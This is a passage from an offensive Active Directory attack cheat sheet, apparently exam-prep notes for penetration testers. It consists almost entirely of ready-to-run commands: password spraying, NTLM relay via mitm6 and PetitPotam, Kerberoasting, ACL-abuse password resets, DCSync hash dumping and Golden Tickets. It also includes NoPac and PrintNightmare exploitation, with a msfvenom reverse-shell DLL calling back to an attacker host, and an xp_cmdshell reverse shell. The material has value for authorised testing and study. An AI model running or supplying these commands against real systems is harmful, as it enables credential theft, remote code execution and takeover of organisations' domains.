```bash
# rpcclient one-liner
for u in $(cat valid_users.txt); do rpcclient -U "$u%Welcome1" -c "getusername;quit" <dc_ip> | grep Authority; done

# Kerbrute (faster, generates 4768 not 4625)
kerbrute passwordspray -d <domain> --dc <dc_ip> valid_users.txt 'Welcome1'

# CrackMapExec
netexec smb <dc_ip> -u valid_users.txt -p 'Password123' | grep +

# Common passwords to try
# Welcome1, Password1, Password123, Company1!, Summer2024!, Winter2024!
# Season+Year patterns: Spring2024!, Fall2024!
```

**Spray from Windows:**
```powershell
# DomainPasswordSpray.ps1 (auto-excludes near-lockout)
Import-Module .\DomainPasswordSpray.ps1
Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue

# Kerbrute from Windows
.\kerbrute.exe passwordspray -d <domain> --dc <dc_ip> valid_users.txt 'Welcome1'
```

### 9.1.6 - mitm6 (IPv6 DHCPv6/WPAD Takeover)

> Windows prefers IPv6. Most networks have no DHCPv6 server. mitm6 fills the gap — becomes
> DNS for the network, poisons WPAD → captures NTLM auth → relay to LDAPS / ADCS / SMB.

```bash
# Terminal 1: mitm6 (only target the domain we care about)
sudo mitm6 -d <domain> -i <interface>

# Terminal 2: ntlmrelayx with IPv6 + LDAPS target
# Goal: delegate access (RBCD) on any computer that auths
sudo ntlmrelayx.py -6 -t ldaps://<dc_ip> -wh fakewpad.<domain> --delegate-access --no-smb-server

# Alt targets:
# Relay to ADCS HTTP enrollment (ESC8):
sudo ntlmrelayx.py -6 -t http://<adcs_host>/certsrv/certfnsh.asp -wh fakewpad.<domain> --adcs --template DomainController

# Relay to SMB on file server (if signing not required):
sudo ntlmrelayx.py -6 -tf smb_targets.txt -wh fakewpad.<domain> -smb2support --no-http-server

# When user logs in / reboots / opens browser → WPAD lookup → 4xx → NTLM auth → relayed
# Successful relay: ntlmrelayx prints "[*] Authenticating against ldaps://... SUCCEED"
# RBCD set on target computer → use FAKE$ + getST.py to impersonate admin (see §9.8.6)
```

### 9.1.7 - AS-REP Roasting (No Creds Needed)

```bash
# Find users with DONT_REQ_PREAUTH
GetNPUsers.py <domain>/ -usersfile usernames.txt -format hashcat -outputfile asrep.hash -dc-ip <dc_ip>

# Crack
hashcat -m 18200 asrep.hash /usr/share/wordlists/rockyou.txt
```

---

## 9.2 - CREDENTIALED ENUMERATION (Linux)

**Prerequisite: valid domain creds (cleartext, NTLM hash, or SYSTEM on domain-joined host)**

### 9.2.1 - CrackMapExec / NetExec

```bash
# Users (with badpwdcount for targeted spraying)
netexec smb <dc_ip> -u <user> -p '<pass>' --users

# Groups
netexec smb <dc_ip> -u <user> -p '<pass>' --groups

# Shares (check READ/WRITE access)
netexec smb <dc_ip> -u <user> -p '<pass>' --shares

# Logged-on users (find DA sessions!)
netexec smb <target> -u <user> -p '<pass>' --loggedon-users

# Password policy
netexec smb <dc_ip> -u <user> -p '<pass>' --pass-pol

# RID brute (find all users even without --users)
netexec smb <dc_ip> -u <user> -p '<pass>' --rid-brute

# Spider shares for files
netexec smb <dc_ip> -u <user> -p '<pass>' -M spider_plus --share 'Department Shares'

# Pass-the-Hash
netexec smb <target> -u <user> -H <nt_hash>

# Local admin spray across subnet
netexec smb 172.16.5.0/23 --local-auth -u administrator -H <hash> | grep +
```

### 9.2.2 - SMBMap

```bash
# Check access
smbmap -u <user> -p '<pass>' -d <domain> -H <dc_ip>

# Recursive listing
smbmap -u <user> -p '<pass>' -d <domain> -H <dc_ip> -R 'Department Shares' --dir-only

# Search file contents
smbmap -u <user> -p '<pass>' -d <domain> -H <dc_ip> -R 'Department Shares' -A <pattern>
```

### 9.2.3 - rpcclient (Authenticated)

```bash
rpcclient -U '<user>%<pass>' <dc_ip>
rpcclient $> enumdomusers
rpcclient $> queryuser 0x457        # By RID
rpcclient $> querygroup 0x200       # Domain Users
rpcclient $> querygroupmem 0x200    # Group members
```

### 9.2.4 - BloodHound.py (Linux Collector)

```bash
# Run collection (all methods)
sudo bloodhound-python -u '<user>' -p '<pass>' -ns <dc_ip> -d <domain> -c All

# Specific collection
bloodhound-python -u '<user>' -p '<pass>' -ns <dc_ip> -d <domain> -c DCOnly  # No computer connections
bloodhound-python -u '<user>' -p '<pass>' -ns <dc_ip> -d <domain> -c Group,LocalAdmin,Session,ACL

# Output: timestamp_computers.json, timestamp_groups.json, timestamp_users.json, timestamp_domains.json
# Zip for upload
zip -r bh_data.zip *.json

# Start neo4j and BloodHound GUI
sudo neo4j start
bloodhound
# Default creds: neo4j / <set password>
# Upload zip → Analysis tab → Run queries
```

**Key BloodHound queries for exam:**
```
- Find Shortest Paths to Domain Admins
- Find Computers where Domain Users are Local Admin
- Find Workstations where Domain Users can RDP
- Find Servers where Domain Users can RDP
- Find Computers with Unsupported Operating Systems
- Find All Domain Trusts
```

### 9.2.5 - Windapsearch

```bash
# Domain Admins
python3 windapsearch.py --dc-ip <dc_ip> -u <user>@<domain> -p '<pass>' --da

# Privileged users (recursive nested group membership)
python3 windapsearch.py --dc-ip <dc_ip> -u <user>@<domain> -p '<pass>' -PU

# All users
python3 windapsearch.py --dc-ip <dc_ip> -u <user>@<domain> -p '<pass>' -U
```

### 9.2.6 - Impacket Toolkit

```bash
# psexec.py (needs local admin, drops exe to ADMIN$, gives SYSTEM)
psexec.py <domain>/<user>:'<pass>'@<target>

# wmiexec.py (stealthier, runs as user not SYSTEM, fewer logs)
wmiexec.py <domain>/<user>:'<pass>'@<target>

# smbexec.py (creates temp bat files, noisy)
smbexec.py <domain>/<user>:'<pass>'@<target>

# atexec.py (task scheduler)
atexec.py <domain>/<user>:'<pass>'@<target> <command>

# Pass-the-Hash with any of these
psexec.py -hashes :<nt_hash> <domain>/<user>@<target>
```

---

## 9.3 - CREDENTIALED ENUMERATION (Windows)

### 9.3.1 - ActiveDirectory PowerShell Module

```powershell
Import-Module ActiveDirectory

# Domain info
Get-ADDomain
Get-ADDomain -Identity <child_domain>

# Trust relationships
Get-ADTrust -Filter *

# Users with SPNs (Kerberoast targets)
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName

# All groups
Get-ADGroup -Filter * | select name

# Group members
Get-ADGroupMember -Identity "Domain Admins"

# Users with PASSWD_NOTREQD
Get-ADUser -Filter 'userAccountControl -band 32' -Properties userAccountControl

# Users with reversible encryption
Get-ADUser -Filter 'userAccountControl -band 128' -Properties userAccountControl
```

### 9.3.2 - PowerView

```powershell
Import-Module .\PowerView.ps1

# Domain users
Get-DomainUser -Identity <user> | select *
Get-DomainUser -SPN -Properties samaccountname,ServicePrincipalName  # SPN accounts
Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*DONT_REQ_PREAUTH*'}  # AS-REP

# Domain groups (recursive membership)
Get-DomainGroupMember -Identity "Domain Admins" -Recurse

# Domain computers
Get-DomainComputer | select dnshostname,operatingsystem

# GPOs
Get-DomainGPO | select displayname

# ACLs (find interesting rights)
Find-InterestingDomainAcl -ResolveGUIDs

# Targeted ACL search
$sid = Convert-NameToSid <user>
Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid}

# Test local admin access
Test-AdminAccess -ComputerName <target>

# Find where user has local admin
Find-LocalAdminAccess

# Find user sessions
Find-DomainUserLocation

# Shares
Find-DomainShare -CheckShareAccess
Find-InterestingDomainShareFile

# Trust mapping
Get-DomainTrustMapping
Get-DomainTrust -Domain <domain>

# Policy
Get-DomainPolicy
Get-DomainPolicy | Select-Object -ExpandProperty SystemAccess  # Password policy
```

### 9.3.3 - BloodHound/SharpHound (Windows Collector)

```powershell
# Run SharpHound
.\SharpHound.exe -c All --zipfilename <domain>

# Specific methods
.\SharpHound.exe -c DCOnly          # No computer connections (stealthier)
.\SharpHound.exe -c ACL,Group,Trusts
.\SharpHound.exe --stealth           # Stealth collection

# Upload zip to BloodHound GUI
bloodhound  # Start GUI (creds: neo4j / <password>)
```

### 9.3.3b - LAPS + gMSA Password Extraction

> Both store passwords in LDAP attributes readable by privileged users.
> Common one-click wins if BloodHound shows we have read rights.

**LAPS (ms-Mcs-AdmPwd / msLAPS-Password):**
```bash
# Find who can read LAPS
netexec ldap <dc_ip> -u <user> -p '<pass>' -M laps
# Output: rows = computer + cleartext local admin pass (if we have rights)

# Manual LDAP query
ldapsearch -h <dc_ip> -x -D '<user>@<domain>' -w '<pass>' -b 'DC=...' '(ms-Mcs-AdmPwd=*)' ms-Mcs-AdmPwd cn
# New LAPS (Windows LAPS 2023+):
ldapsearch -h <dc_ip> -x -D '<user>@<domain>' -w '<pass>' -b 'DC=...' '(msLAPS-Password=*)' msLAPS-Password cn

# Windows
Get-LAPSComputers
Get-DomainObject -Identity <computer> -Properties ms-Mcs-AdmPwd
# New LAPS:
Get-LapsADPassword -Identity <computer> -AsPlainText
```

**gMSA (msDS-ManagedPassword via gMSADumper):**
```bash
# Requires PrincipalsAllowedToRetrieveManagedPassword membership
# BloodHound: ReadGMSAPassword edge → we can extract

python3 gMSADumper.py -u <user> -p '<pass>' -d <domain> -l <dc_ip>
# Output: gMSA account NT hash → Pass-the-Hash to run as service account

# Use the hash
netexec smb <target> -u 'GMSA_ACCOUNT$' -H <nt_hash>
psexec.py -hashes :<nt_hash> '<domain>/GMSA_ACCOUNT$@<target>'
```

### 9.3.4 - Security Controls Enumeration

```powershell
# Windows Defender status
Get-MpComputerStatus
sc query windefend

# AppLocker policy
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

# PowerShell Language Mode
$ExecutionContext.SessionState.LanguageMode

# LAPS enumeration
Find-LAPSDelegatedGroups
Find-AdmPwdExtendedRights
Get-LAPSComputers

# Firewall status
netsh advfirewall show allprofiles

# Check logged-on users (are you alone?)
qwinsta
```

### 9.3.5 - Living Off the Land

```powershell
# Host recon
hostname
systeminfo
[System.Environment]::OSVersion.Version
ipconfig /all
arp -a
route print
netsh advfirewall show allprofiles
sc query windefend

# Domain recon (built-in)
net user /domain
net group /domain
net group "Domain Admins" /domain
net group "Domain Controllers" /domain
net accounts /domain
net localgroup administrators /domain

# net1 trick (avoids some EDR detection)
net1 user /domain
net1 group "Domain Admins" /domain

# WMI
wmic ntdomain list /format:list
wmic computersystem get Name,Domain,Manufacturer,Model,Username,Roles /format:List
wmic useraccount list /format:list
wmic group list /format:list

# dsquery
dsquery user
dsquery computer
dsquery * "CN=Users,DC=domain,DC=local"
# Find DCs
dsquery * -filter "(userAccountControl:1.2.840.113556.1.4.803:=8192)" -limit 5 -attr sAMAccountName
# Find users with PASSWD_NOTREQD
dsquery * -filter "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=32))" -attr distinguishedName userAccountControl

# PowerShell history (may contain creds!)
Get-Content $env:APPDATA\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt

# Downgrade PowerShell (bypass Script Block Logging)
powershell.exe -version 2
Get-Host  # Verify version
```

---

## 9.4 - KERBEROASTING

**Prerequisite: domain user creds (any level) or SYSTEM on domain-joined host**

### 9.4.1 - From Linux (GetUserSPNs.py)

```bash
# List SPN accounts with group membership
GetUserSPNs.py -dc-ip <dc_ip> <domain>/<user>

# Request all TGS tickets
GetUserSPNs.py -dc-ip <dc_ip> <domain>/<user> -request

# Target specific user, save to file
GetUserSPNs.py -dc-ip <dc_ip> <domain>/<user> -request-user <spn_user> -outputfile tgs_hash

# Crack (etype 23 = RC4)
hashcat -m 13100 tgs_hash /usr/share/wordlists/rockyou.txt

# If AES (etype 18) - much slower
hashcat -m 19700 tgs_hash /usr/share/wordlists/rockyou.txt
```

### 9.4.2 - From Windows (Rubeus)

```powershell
# Stats (see encryption types, password ages)
.\Rubeus.exe kerberoast /stats

# Target admin-count=1 accounts (high value)
.\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap

# All SPN accounts
.\Rubeus.exe kerberoast /nowrap

# Specific user
.\Rubeus.exe kerberoast /user:<spn_user> /nowrap

# Force RC4 downgrade (bypass AES - works pre-Server 2019)
.\Rubeus.exe kerberoast /usetgtdeleg /nowrap

# AES Kerberoasting
.\Rubeus.exe kerberoast /aes /nowrap

# Output to file
.\Rubeus.exe kerberoast /outfile:hashes.txt
```

### 9.4.3 - From Windows (PowerView + Mimikatz)

```powershell
# Enumerate SPN accounts
Get-DomainUser * -spn | select samaccountname

# Get TGS in Hashcat format
Get-DomainUser -Identity <spn_user> | Get-DomainSPNTicket -Format Hashcat

# Export all
Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\tgs.csv -NoTypeInformation

# Semi-manual: Request ticket with PowerShell, extract with Mimikatz
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/host:1433"

# Mimikatz extract
mimikatz # base64 /out:true
mimikatz # kerberos::list /export
# Convert base64 → kirbi → john format → hashcat
```

### 9.4.4 - Encryption Types

```
RC4 (type 23) = $krb5tgs$23$* → hashcat -m 13100 → FAST
AES-256 (type 18) = $krb5tgs$18$* → hashcat -m 19700 → SLOW (100x+)

Key insight: Pre-Server 2019 DCs → use /tgtdeleg to force RC4 even on AES accounts
Server 2019+ → always returns highest supported encryption

Mitigation: Set msDS-SupportedEncryptionTypes to 24 (AES only) on SPN accounts
```

### 9.4.5 - After Cracking

```bash
# Validate creds
netexec smb <dc_ip> -u <spn_user> -p '<cracked_pass>'

# Spray cracked password across domain (password reuse!)
netexec smb <dc_range> -u <user_list> -p '<cracked_pass>'

# If SPN is MSSQLSvc → connect with mssqlclient.py
mssqlclient.py <domain>/<user>:'<pass>'@<target> -windows-auth
# Enable xp_cmdshell for RCE
SQL> enable_xp_cmdshell
SQL> xp_cmdshell whoami
```

---

## 9.5 - ACL ABUSE

### 9.5.1 - Key ACE Types

```
GenericAll      → Full control (reset password, add member, Kerberoast)
GenericWrite    → Write non-protected attrs (set SPN for targeted Kerberoast, add to group)
WriteDACL       → Modify ACL (grant self DCSync rights)
WriteOwner      → Change object owner → then WriteDACL
ForceChangePassword → Reset user password without knowing current
AddSelf         → Add self to group
AllExtendedRights → Reset password, add to group
```

### 9.5.2 - ACL Enumeration

**PowerView (targeted - start from controlled user):**
```powershell
# Get SID of controlled user
$sid = Convert-NameToSid <controlled_user>

# Find objects controlled by this user
Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid}

# Key output fields:
# - ObjectDN: target object
# - ObjectAceType: the right (e.g., User-Force-Change-Password)
# - ActiveDirectoryRights: the permission level
```

**BloodHound (visual - fastest):**
```
1. Upload SharpHound data
2. Set controlled user as starting node
3. Check "Outbound Control Rights" in Node Info
4. Check "Transitive Object Control" for full chain
5. Use "Find Shortest Paths to Domain Admins" query
6. Right-click edges → Help for abuse instructions
```

**Top Cypher queries (paste in BloodHound Cypher tab):**
```
// 1. Shortest path from owned users to Domain Admins
MATCH p=shortestPath((u:User {owned:true})-[*1..]->(g:Group)) WHERE g.name STARTS WITH 'DOMAIN ADMINS@' RETURN p

// 2. All kerberoastable users (have SPN + enabled)
MATCH (u:User) WHERE u.hasspn=true AND u.enabled=true RETURN u.name, u.serviceprincipalnames

// 3. AS-REP roastable users (DONT_REQ_PREAUTH)
MATCH (u:User {dontreqpreauth:true}) RETURN u.name

// 4. Where owned users can RDP / PSRemote
MATCH p=(u:User {owned:true})-[:CanRDP|CanPSRemote*1..]->(c:Computer) RETURN p

// 5. Outbound ACL edges from any owned user (every object they can modify)
MATCH p=(u:User {owned:true})-[:GenericAll|GenericWrite|WriteOwner|WriteDacl|ForceChangePassword|AllExtendedRights*1..]->(t) RETURN p

// 6. Computers with unconstrained delegation (DA harvest targets)
MATCH (c:Computer {unconstraineddelegation:true}) RETURN c.name

// 7. Computers with constrained delegation set
MATCH (c) WHERE c.allowedtodelegate IS NOT NULL RETURN c.name, c.allowedtodelegate

// 8. Find DA sessions on non-DC machines (lateral move targets)
MATCH (u:User)-[:MemberOf*1..]->(g:Group) WHERE g.name STARTS WITH 'DOMAIN ADMINS@' WITH u MATCH (c:Computer)-[:HasSession]->(u) WHERE NOT c.name CONTAINS 'DC' RETURN c.name, u.name

// 9. gMSAs we can read
MATCH p=(u:User {owned:true})-[:ReadGMSAPassword]->(g) RETURN p

// 10. LAPS read rights from owned position
MATCH p=(u:User {owned:true})-[:ReadLAPSPassword]->(c:Computer) RETURN p
```

**Mark a node as owned (so the above queries work):**
```
// In Cypher tab
MATCH (u:User) WHERE u.name = 'USER@DOMAIN.LOCAL' SET u.owned = true RETURN u
```

### 9.5.3 - ACL Attack Chain Example

```
User A (controlled) → ForceChangePassword → User B
User B → GenericWrite → Group C (add self)
Group C → nested in → Group D
Group D → GenericAll → User E
User E → has DCSync rights → Full domain compromise

Execution:
1. Set-DomainUserPassword -Identity UserB -AccountPassword 'NewPass!' -Credential $CredA
2. Add-DomainGroupMember -Identity "GroupC" -Members UserB -Credential $CredB
3. (Inherits Group D rights automatically via nesting)
4. Set-DomainUserPassword -Identity UserE -AccountPassword 'NewPass2!' (or targeted Kerberoast)
5. secretsdump.py domain/UserE:'NewPass2!'@dc_ip → DCSync → all hashes
```

### 9.5.4 - ACL Abuse Commands

**ForceChangePassword:**
```powershell
$SecPassword = ConvertTo-SecureString '<our_pass>' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('DOMAIN\<our_user>', $SecPassword)
$newpass = ConvertTo-SecureString 'Pwn3d!' -AsPlainText -Force
Set-DomainUserPassword -Identity <target> -AccountPassword $newpass -Credential $Cred -Verbose
```

**AddMember (GenericWrite over group):**
```powershell
Add-DomainGroupMember -Identity "<target_group>" -Members "<our_user>" -Credential $Cred -Verbose
# Verify
Get-DomainGroupMember -Identity "<target_group>" -Recurse
```

**Targeted Kerberoast (GenericWrite over user - set SPN):**
```powershell
Set-DomainObject -Credential $Cred -Identity <target_user> -SET @{serviceprincipalname='fake/SPN'}
# Now Kerberoast the user
GetUserSPNs.py -dc-ip <dc_ip> <domain>/<user> -request-user <target_user>
# Clean up
Set-DomainObject -Credential $Cred -Identity <target_user> -Clear serviceprincipalname
```

**Linux equivalents:**
```bash
# ForceChangePassword
pth-net rpc password <target> '<new_pass>' -U '<domain>/<our_user>%<our_pass>' -S <dc_ip>

# AddMember
pth-net rpc group addmem "<target_group>" "<our_user>" -U '<domain>/<our_user>%<our_pass>' -S <dc_ip>
```

---

## 9.6 - DCSync

**Prerequisite: account with Replicating Directory Changes + Replicating Directory Changes All permissions**
(Default: Domain Admins, Enterprise Admins, or delegated accounts)

### 9.6.1 - Enumerate DCSync Rights

```powershell
# Check specific user's replication rights
$sid = Convert-NameToSid <target_user>
Get-ObjectAcl "DC=domain,DC=local" -ResolveGUIDs | ? { ($_.ObjectAceType -match 'Replication-Get')} | ?{$_.SecurityIdentifier -match $sid} | select AceQualifier, ObjectDN, ActiveDirectoryRights, ObjectAceType | fl
```

### 9.6.2 - Execute DCSync

**Linux (secretsdump.py):**
```bash
# All hashes + Kerberos keys + cleartext
secretsdump.py -outputfile domain_hashes -just-dc <domain>/<user>:'<pass>'@<dc_ip>

# NTLM only
secretsdump.py -outputfile domain_hashes -just-dc-ntlm <domain>/<user>:'<pass>'@<dc_ip>

# Single user
secretsdump.py <domain>/<user>:'<pass>'@<dc_ip> -just-dc-user <target_user>

# With hash
secretsdump.py -hashes :<nt_hash> <domain>/<user>@<dc_ip>

# Useful flags: -pwd-last-set, -history, -user-status
```

**Windows (Mimikatz):**
```powershell
# Must run as DCSync-capable user
runas /netonly /user:DOMAIN\<dcsync_user> powershell
mimikatz # privilege::debug
mimikatz # lsadump::dcsync /domain:<domain> /user:DOMAIN\<target>
```

### 9.6.3 - After DCSync

```bash
# Use krbtgt hash for Golden Ticket (persistence)
mimikatz # kerberos::golden /user:Administrator /domain:<domain> /sid:<domain_sid> /krbtgt:<krbtgt_hash> /ptt

# Use admin hash for Pass-the-Hash
netexec smb <dc_ip> -u administrator -H <admin_nt_hash>
psexec.py -hashes :<admin_nt_hash> <domain>/administrator@<dc_ip>

# Crack hashes offline
hashcat -m 1000 hashes.ntds /usr/share/wordlists/rockyou.txt
```

---

## 9.7 - PRIVILEGED ACCESS & LATERAL MOVEMENT

### 9.7.1 - RDP Access

```powershell
# Enumerate RDP users (PowerView)
Get-NetLocalGroupMember -ComputerName <target> -GroupName "Remote Desktop Users"

# BloodHound: CanRDP edge, "Find Workstations where Domain Users can RDP"

# Connect from Linux
xfreerdp /v:<target> /u:<user> /p:'<pass>'
xfreerdp /v:<target> /u:<user> /pth:<nt_hash>  # PtH

# Connect from Windows
mstsc.exe /v:<target>
```

### 9.7.2 - WinRM Access

```powershell
# Enumerate WinRM users (PowerView)
Get-NetLocalGroupMember -ComputerName <target> -GroupName "Remote Management Users"

# BloodHound: CanPSRemote edge
# Custom Cypher: MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-[:CanPSRemote*1..]->(c:Computer) RETURN p2

# From Windows
$password = ConvertTo-SecureString "<pass>" -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential("DOMAIN\<user>", $password)
Enter-PSSession -ComputerName <target> -Credential $cred

# From Linux (evil-winrm)
evil-winrm -i <target> -u <user> -p '<pass>'
evil-winrm -i <target> -u <user> -H <nt_hash>
```

### 9.7.3 - MSSQL Admin Access

```bash
# BloodHound: SQLAdmin edge

# From Linux
mssqlclient.py <domain>/<user>:'<pass>'@<target> -windows-auth
SQL> enable_xp_cmdshell
SQL> xp_cmdshell whoami
SQL> xp_cmdshell powershell -e <base64_revshell>

# Hash capture via xp_dirtree
SQL> xp_dirtree '\\<attacker_ip>\share'

# From Windows (PowerUpSQL)
Get-SQLInstanceDomain
Get-SQLServerLinkCrawl -Instance <target>
Invoke-SQLOSCmd -Instance <target> -Command "whoami"
```

### 9.7.4 - Pass-the-Hash

```bash
# CrackMapExec (scan range)
netexec smb <range> --local-auth -u <user> -H <nt_hash> | grep +

# Impacket
psexec.py -hashes :<nt_hash> <domain>/<user>@<target>
wmiexec.py -hashes :<nt_hash> <domain>/<user>@<target>
evil-winrm -i <target> -u <user> -H <nt_hash>
xfreerdp /v:<target> /u:<user> /pth:<nt_hash>
```

### 9.7.5 - Kerberos Double Hop Problem

**Problem:** WinRM to Host A → Host A tries to access DC → fails (TGT not cached)

**Solutions:**
```powershell
# Solution 1: PSCredential with every command
$SecPassword = ConvertTo-SecureString 'pass' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('DOMAIN\user', $SecPassword)
Invoke-Command -ComputerName HOST -Credential $Cred -ScriptBlock { whoami }

# Solution 2: Register-PSSessionConfiguration
Register-PSSessionConfiguration -Name sess -RunAsCredential DOMAIN\user
Enter-PSSession -ComputerName HOST -Credential $cred -ConfigurationName sess

# Solution 3: Use RDP instead (password cached in memory)
xfreerdp /v:HOST /u:user /p:pass
```

---

## 9.8 - BLEEDING EDGE / ADVANCED ATTACKS

### 9.8.1 - NoPac (SamAccountName Spoofing)

CVE-2021-42278 + CVE-2021-42287. Any domain user → Domain Admin.

```bash
# Scan for vulnerability
sudo python3 scanner.py <domain>/<user>:<pass> -dc-ip <dc_ip> -use-ldap

# Exploit (SYSTEM shell on DC)
sudo python3 noPac.py <domain>/<user>:<pass> -dc-ip <dc_ip> -dc-host <dc_hostname> -shell --impersonate administrator -use-ldap

# DCSync via noPac
sudo python3 noPac.py <domain>/<user>:<pass> -dc-ip <dc_ip> -dc-host <dc_hostname> --impersonate administrator -use-ldap -dump -just-dc-user <domain>/administrator

# Requires: ms-DS-MachineAccountQuota > 0 (default: 10)
# Mitigation: Set ms-DS-MachineAccountQuota to 0
```

### 9.8.2 - PrintNightmare

CVE-2021-34527 / CVE-2021-1675. RCE via Print Spooler service.

```bash
# Check if Print Spooler exposed
rpcdump.py @<dc_ip> | egrep 'MS-RPRN|MS-PAR'

# Exploit (needs cube0x0's Impacket fork)
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<attacker> LPORT=8080 -f dll > shell.dll
sudo smbserver.py -smb2support Share /path/to/shell.dll
python3 CVE-2021-1675.py <domain>/<user>:<pass>@<target> '\\<attacker>\Share\shell.dll'

# Mitigation: Disable Print Spooler service
# Check: Get-Service Spooler
```

### 9.8.3 - PetitPotam + NTLM Relay to ADCS

Coerce DC authentication → relay to ADCS → get certificate → authenticate as DC.

```bash
# Check if MS-EFSRPC exposed
rpcdump.py @<target> | grep MS-EFSR

# PetitPotam - coerce auth to attacker
python3 PetitPotam.py <attacker_ip> <dc_ip>

# ntlmrelayx to ADCS web enrollment
ntlmrelayx.py -t http://<adcs_host>/certsrv/certfnsh.asp -smb2support --adcs --template DomainController

# Use captured certificate for PKINIT auth
python3 gettgtpkinit.py -cert-pfx <pfx_file> -pfx-pass '' <domain>/<dc_machine_account>$ <dc_machine_account>.ccache

# Extract NT hash from TGT
export KRB5CCNAME=<dc_machine_account>.ccache
python3 getnthash.py <domain>/<dc_machine_account>$ -key <asrep_key>

# DCSync with DC machine account hash
secretsdump.py -just-dc-ntlm -hashes :<nt_hash> <domain>/<dc_machine_account>$@<dc_ip>
```

### 9.8.3b - Coerced Auth Methods (full menu)

> PetitPotam shown in §9.8.3. Other coercion methods below — try in order until one fires.
> All have the same shape: force <victim> to authenticate to <attacker>, which relays the NTLM.

```bash
# 1. PetitPotam (MS-EFSRPC) — patched on newest Windows but often still works
python3 PetitPotam.py <attacker_ip> <victim_ip>
python3 PetitPotam.py -u <user> -p '<pass>' -d <domain> <attacker_ip> <victim_ip>   # authenticated variant

# 2. PrinterBug (MS-RPRN) — needs Print Spooler running on victim
python3 printerbug.py <domain>/<user>:'<pass>'@<victim_ip> <attacker_ip>
# Or check first:
rpcdump.py @<victim_ip> | egrep 'MS-RPRN|MS-PAR'

# 3. DFSCoerce (MS-DFSNM) — uses DFS NetrDfsRemoveStdRoot
python3 dfscoerce.py -u <user> -p '<pass>' -d <domain> <attacker_ip> <victim_ip>

# 4. ShadowCoerce (MS-FSRVP) — uses File Server VSS
python3 shadowcoerce.py -u <user> -p '<pass>' -d <domain> <attacker_ip> <victim_ip>

# 5. Coercer (orchestrator that runs all above + more, picks one that works)
python3 Coercer.py coerce -u <user> -p '<pass>' -d <domain> -l <attacker_ip> -t <victim_ip>
python3 Coercer.py scan -u <user> -p '<pass>' -d <domain> -t <victim_ip>     # check which work

# 6. WebClient service abuse (HTTP-based coercion → needed for ADCS ESC8)
# If WebClient running: PetitPotam to HTTP target works
# Trigger WebClient start remotely:
python3 PetitPotam.py 'http://attacker@80/path' <victim>     # if SearchConnector trick works
```

**Relay targets matrix (where to point ntlmrelayx -t):**
```
Coerced victim    Target relay                          Result
─────────────────────────────────────────────────────────────────────
Workstation       smb://<other_workstation>             RCE (if signing off)
DC                ldaps://<dc>                          add user / RBCD / ACL writes
DC                http://<adcs>/certsrv (--adcs)        cert as DC$ → DCSync (ESC8)
DC                rpc://<adcs> (--adcs --template ...)  cert as DC$ (ESC11)
Any computer      ldaps://<dc> --delegate-access        RBCD on victim → impersonate
```

### 9.8.4 - Shadow Credentials

```bash
# Check if target has msDS-KeyCredentialLink
# If we have write access to this attribute → PKINIT auth as target

# Automated with Certipy
certipy shadow auto -u <user>@<domain> -p '<pass>' -dc-ip <dc_ip> -account <target_account>

# Output: NT hash for target account
```

### 9.8.5 - GPP Passwords (MS14-025)

```bash
# Find cpassword in SYSVOL
findstr /S /I cpassword \\<dc>\sysvol\<domain>\policies\*.xml

# Decrypt
gpp-decrypt <cpassword_hash>
# Decrypts to plaintext local admin password
```

### 9.8.6 - Delegation Abuse

**Unconstrained Delegation (TrustedForDelegation):**
```bash
# Find unconstrained hosts
# Linux
ldapsearch -h <dc_ip> -x -D '<user>@<domain>' -w '<pass>' -b 'DC=...,DC=...' '(userAccountControl:1.2.840.113556.1.4.803:=524288)' sAMAccountName
# Windows
Get-DomainComputer -Unconstrained | select dnshostname

# Compromise unconstrained host → harvest TGTs
# Linux (if you have local admin via PtH)
secretsdump.py -just-dc-user 'krbtgt' <domain>/<user>:'<pass>'@<dc>  # for golden, separate
# Better: deploy rubeus-equivalent harvester. On Linux compromised host:
# Use PoshADCS or krbrelayx with -t flag

# Coerce a DA to authenticate to compromised unconstrained host (e.g. via printerbug)
python3 printerbug.py <domain>/<user>:'<pass>'@<dc_ip> <compromised_unconstrained_host>
# Then on compromised host (Windows): Rubeus.exe monitor /interval:1 /targetuser:<DA>
# Or Linux: krbrelayx.py -aesKey <host_aes> -t <target_spn>
```

**Constrained Delegation (msDS-AllowedToDelegateTo) — Linux full chain:**
```bash
# Find constrained delegation
ldapsearch -h <dc_ip> -x -D '<user>@<domain>' -w '<pass>' -b 'DC=...' '(msDS-AllowedToDelegateTo=*)' sAMAccountName msDS-AllowedToDelegateTo

# We need the compromised service account's password OR NT hash OR AES key
# S4U2self → get TGS for ourselves as target user
# S4U2proxy → swap to TGS for target SPN

getST.py -spn cifs/<target_host> -impersonate administrator -dc-ip <dc_ip> <domain>/<svc_account>:'<pass>'
# or with hash
getST.py -spn cifs/<target_host> -impersonate administrator -dc-ip <dc_ip> -hashes :<nt_hash> <domain>/<svc_account>

# Set ticket env var and use it
export KRB5CCNAME=administrator.ccache
psexec.py -k -no-pass <target_host>
# Or secretsdump
secretsdump.py -k -no-pass <target_host>

# Protocol Transition trick (TrustedToAuthForDelegation flag): can impersonate ANY user
# Without that flag: works only for users that authenticated via Kerberos to the svc
```

**Resource-Based Constrained Delegation (RBCD) — full Linux chain:**
```bash
# Requires: Write access to target computer's msDS-AllowedToActOnBehalfOfOtherIdentity
# Common source: GenericWrite/GenericAll over computer object via BloodHound

